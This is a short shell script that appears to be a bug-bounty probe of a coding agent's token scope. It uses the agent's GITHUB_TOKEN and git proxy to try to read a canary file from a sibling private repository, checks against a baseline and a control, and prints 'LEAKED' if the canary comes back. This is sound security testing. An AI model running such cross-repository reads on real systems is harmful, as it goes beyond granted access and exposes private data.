#!/bin/sh
# Release probe. Prints HTTP status codes only; no secrets are printed.
echo "RELEASE_PROBE_START"
SIB=aidan2-bbp/copilot-skill-grant-canary
echo "A) api read of sibling private repo, with the agent token:"
printf "   contents -> HTTP %s\n" "$(curl -s -o /tmp/a.out -w '%{http_code}' --max-time 10 -H "Authorization: Bearer ${GITHUB_TOKEN}" -H "Accept: application/vnd.github+json" https://api.github.com/repos/$SIB/contents/CANARY.txt)"
grep -o 'SIBLING_REPO_CANARY[A-Za-z0-9-]*' /tmp/a.out 2>/dev/null | head -1 | sed 's/^/   LEAKED: /'
echo "B) api read without any token (baseline):"
printf "   contents -> HTTP %s\n" "$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 https://api.github.com/repos/$SIB/contents/CANARY.txt)"
echo "C) api read of the ASSIGNED repo, with the agent token (positive control):"
printf "   own README -> HTTP %s\n" "$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 -H "Authorization: Bearer ${GITHUB_TOKEN}" https://api.github.com/repos/aidan2-bbp/copilot-skill-grant-test/contents/README.md)"
echo "D) git clone of the sibling repo through the agent's git proxy:"
git clone -q https://github.com/$SIB /tmp/sib 2>&1 | tail -2 | sed 's/^/   /'
[ -f /tmp/sib/CANARY.txt ] && echo "   LEAKED VIA CLONE: $(grep -o 'SIBLING_REPO_CANARY[A-Za-z0-9-]*' /tmp/sib/CANARY.txt)" || echo "   clone did not yield the file"
echo "RELEASE_PROBE_END"
